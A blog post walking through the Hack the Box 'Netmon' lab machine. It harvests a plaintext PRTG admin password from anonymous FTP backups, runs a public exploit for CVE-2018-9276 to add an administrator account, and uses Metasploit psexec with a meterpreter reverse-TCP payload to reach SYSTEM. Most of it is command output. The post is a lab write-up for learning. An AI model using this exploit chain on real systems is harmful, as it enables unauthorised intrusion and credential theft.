---
layout: post
title:  "Hack the Box - Netmon"
date:   2019-03-02 23:23:00
categories: [walkthrough, htb]
comments: false
---
![HTB-netmon](/img/htb/netmon.png)

An easy box by mrb3n.  

{% highlight bash %}
meterpreter > sysinfo
Computer        : NETMON
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
{% endhighlight %}

<!--more-->

## Discovery/Enumeration

{% highlight bash %}
┌[ ~/hackthebox/boxes ] [master]
└─> root@kali # nmap -sV 10.10.10.152
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-06 16:38 MST
Nmap scan report for 10.10.10.152
Host is up (0.055s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
{% endhighlight %}

## Enumeration - FTP TCP/21

FTP is open, lets see if it can take anonymous logins

{% highlight bash %}
┌[ ~/hackthebox/boxes ] [master]
└─> root@kali # ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd \users\Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-02-19  11:35PM                   33 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.06 secs (0.5786 kB/s)
ftp> exit
221 Goodbye.

┌[ ~/hackthebox/boxes ] [master ?]
└─> root@kali # cat user.txt
dd5**************************5a5
{% endhighlight %}

Awesome, well that got us the user flag.  On to root!  While we are on the FTP, lets see if there is any interesting information in the PRTG configuration files.


{% highlight bash %}
┌[ ~/hackthebox/boxes/retired/10.10.10.152 ] [master ?]
└─> root@kali # ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd "/ProgramData/Paessler/PRTG Network Monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-06-20  06:38PM       <DIR>          Configuration Auto-Backups
02-06-20  07:00PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
02-06-20  06:38PM       <DIR>          Logs (Web Server)
02-06-20  06:38PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
02-06-20  06:39PM              1646822 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget PRTG*
mget PRTG Configuration.dat? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 0.71 secs (1.6090 MB/s)
mget PRTG Configuration.old? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
y226 Transfer complete.
1189697 bytes received in 0.71 secs (1.6085 MB/s)
mget PRTG Configuration.old.bak? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 0.66 secs (1.6613 MB/s)
mget PRTG Graph Data Cache.dat? n
ftp>
{% endhighlight %}

Excellent 3 different config files.  Unfortunately the .dat and .old file have encrypted passwords, but `PRTG Configuration.old.dat` has soemthing tasty!

{% highlight xml %}
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
{% endhighlight %}

Logging in with those credentials results in Failure! =(.  

![prtg-success](/img/htb/netmon/prtg-failed.png)  

Now we were looking at an old configuration file, the password did say 2018 and it is now 2019.  Maybe we have a lazy admin?  Attempts with `PrTg@dmin2019` result in victory!

![prtg-success](/img/htb/netmon/prtg-home.png)  

## Exploitation - CVE-2018-9276

Now that we have authenticated access to PRTG we can exploit an authenticated Remote Code Execution vulnerability.  

{% highlight bash %}
┌[ ~/hackthebox/boxes/retired/10.10.10.152 ] [master ?]
└─> root@kali # searchsploit prtg
--------------------------------------------------------- ----------------------------------------
 Exploit Title                                           |  Path
                                                         | (/usr/share/exploitdb/)
--------------------------------------------------------- ----------------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Co | exploits/windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (De | exploits/windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting  | exploits/java/webapps/34108.txt
--------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

The searchsploit exploit failed, so I went to the source.  https://raw.githubusercontent.com/M4LV0/PRTG-Network-Monitor-RCE/master/prtg-exploit.sh

{% highlight bash %}
┌[ ~/hackthebox/boxes/retired/10.10.10.152 ] [master ?]
└─> root@kali # ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1688042001.1581032395; _gid=GA1.4.712639071.1581032395; OCTOPUS1813713946=ezUzOEQ2NjNGLUJEQzgtNDlFQS05MDI3LTU5RUQ4QzQ0REFFRX0%3D"

[+]#########################################################################[+]
[*] PRTG RCE script by M4LV0                                                [*]
[+]#########################################################################[+]
[*] https://github.com/M4LV0                                                [*]
[+]#########################################################################[+]
[*] Authenticated PRTG network Monitor remote code execution  CVE-2018-9276 [*]
[+]#########################################################################[+]

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and add it to the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'

[+]#########################################################################[+]

 [*] file created
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st'
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!

┌[ ~/hackthebox/boxes/retired/10.10.10.152 ] [master ?]
└─> root@kali #
{% endhighlight %}

User created `pentest:P3nT3st!`.  Time to get our shellz and root.txt flag.

{% highlight bash %}
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.10.10.152     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               P3nT3st!         no        The password for the specified username
   SMBUser               pentest          no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.17:4444
[*] 10.10.10.152:445 - Connecting to the server...
[*] 10.10.10.152:445 - Authenticating to 10.10.10.152:445 as user 'pentest'...
[*] 10.10.10.152:445 - Selecting PowerShell target
[*] 10.10.10.152:445 - Executing the payload...
[+] 10.10.10.152:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.152
[*] Meterpreter session 3 opened (10.10.14.17:4444 -> 10.10.10.152:50604) at 2020-02-06 17:35:09 -0700

meterpreter > sysinfo
Computer        : NETMON
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
{% endhighlight %}

### LOOT!

{% highlight bash %}
meterpreter > cat c:\\users\\administrator\\desktop\\root.txt
3018977fb944bf1878f75b879fba67cc
meterpreter >
{% endhighlight %}

And thats it!  There are many other options here, you could forego using the exploit above and do it all manually, or even craft your own exploit.  Since the target system has powershell it should be possible to get an immediate reverse meterpreter session as well.  Happy hunting!
